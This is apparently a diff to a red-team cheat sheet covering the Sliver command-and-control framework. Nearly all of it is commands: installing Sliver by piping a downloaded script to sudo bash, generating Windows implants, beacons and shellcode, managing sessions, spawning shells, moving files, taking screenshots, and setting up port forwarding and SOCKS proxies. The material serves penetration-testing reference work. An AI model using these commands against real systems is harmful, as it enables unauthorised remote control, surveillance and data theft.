@@ -220,7 +220,7 @@ user@host:/opt/Havoc/Client$ ./Havoc
 $ curl https://sliver.sh/install | sudo bash
 ```
 
-### Start Sliver
+#### Start Sliver
 
 ```c
 $ sudo systemctl enable sliver.service
@@ -228,36 +228,76 @@ $ sudo systemctl start sliver.service
 $ sliver
 ```
 
-### Create new Operators
+## Administration
 
 ```c
-$ operator -l <LHOST> -p <LPORT> -n <USERNAME> -s /tmp/<username>.cfg
+sliver > version
+sliver > multiplayer
+sliver > new-player --operator <USERNAME> --lhost <LHOST>
+sliver > players
+sliver > armory install all
 ```
 
-### Create new Website
+### Implant and Beacon Creation 
 
-```c
-$ get --mirror --convert-links --html-extension <WEBSITE>
-$ websites add-content --website <NAME> --web-path <PATH> --content ./public --recursive
+```
+sliver > help generate
+sliver > https local-ip-address --lhost -D
+sliver > generate --mtls <LHOST> --os windows --save /PATH/TO/BINARY
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format sared --save /PATH/TO/BINARY
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
+sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
+sliver > generate beacon --mtls <LHOST> --os windows --save /PATH/TO/BINARY
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format sared --save /PATH/TO/BINARY
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY
+sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY --seconds 5 --jitter 3
 ```
 
-### Create Implants
+### Profile Handling
 
 ```c
-sliver > generate --mtls <IMPLANT> --save /PATH/TO/FOLDER/
+sliver (STALE_PNEUMONIA) > profiles new --mtls <LHOST> --os windows --arch amd64 --format exe session_win_default
+sliver (STALE_PNEUMONIA) > profiles generate --save /PATH/TO/BINARY session_win_default
+sliver > profiles new beacon --mtls <LHOST> --os windows --arch amd64 --format exe  --seconds 5 --jitter 3 beacon_win_default
+sliver > profiles generate --save /PATH/TO/BINARY beacon_win_default
 ```
 
-### Create Beacons
+### Basic Commands, Implant and Beacon Handling
 
 ```c
-sliver > generate beacon --mtls <BEACON> --save /PATH/TO/FOLDER/
-sliver > generate beacon --http <LHOST>:<LPORT>
-sliver > generate beacon --os --mtls <BEACON> --save /PATH/TO/FOLDER/
-sliver > generate beacon --arch --mtls <BEACON> --save /PATH/TO/FOLDER/
+sliver > mtls                                                             // Mutual Transport Layer Security
+sliver > jobs                                                             // display current jobs
+sliver > implants                                                         // show all created implants
+sliver > sessions                                                         // display currently available sessions
+sliver > sessions -i <ID>                                                 // interact with a session
+sliver > use -i <ID>                                                      // interact with a session
+sliver > sessions -k <ID>                                                 // kill a session
+sliver > upload //PATH/TO/LOCAL/FILE/<FILE> /PATH/TO/REMOTE/DIRECTORY     // upload a file
+sliver > download /PATH/TO/LOCAL/FILE/<FILE> /PATH/TO/REMOTE/DIRECTORY    // download a file
+sliver (NEARBY_LANGUAGE) > tasks                                          // show tasks
+sliver > tasks fetch 49ead4a9                                             // fetch a specific task
+sliver (NEARBY_LANGUAGE) > info                                           // provide session information
+sliver (NEARBY_LANGUAGE) > shell                                          // spawn a shell
+sliver (NEARBY_LANGUAGE) > interactive                                    // interact with a session
+sliver (NEARBY_LANGUAGE) > screenshot                                     // create a screenshot
+sliver (NEARBY_LANGUAGE) > background                                     // background the session
 ```
 
-### Create Shellcode
+### Port Forwarding
 
 ```c
-sliver > generate beacon --mtls <LHOST>:<LPORT> -f <FILE>
+sliver (NEARBY_LANGUAGE) > portfwd add --remote <RHOST>:<RPORT>
+```
+
+### SOCKS Proxy
+
+```c
+sliver (NEARBY_LANGUAGE) > socks5 start
+sliver (NEARBY_LANGUAGE) > socks5 stop -i 1
 ```
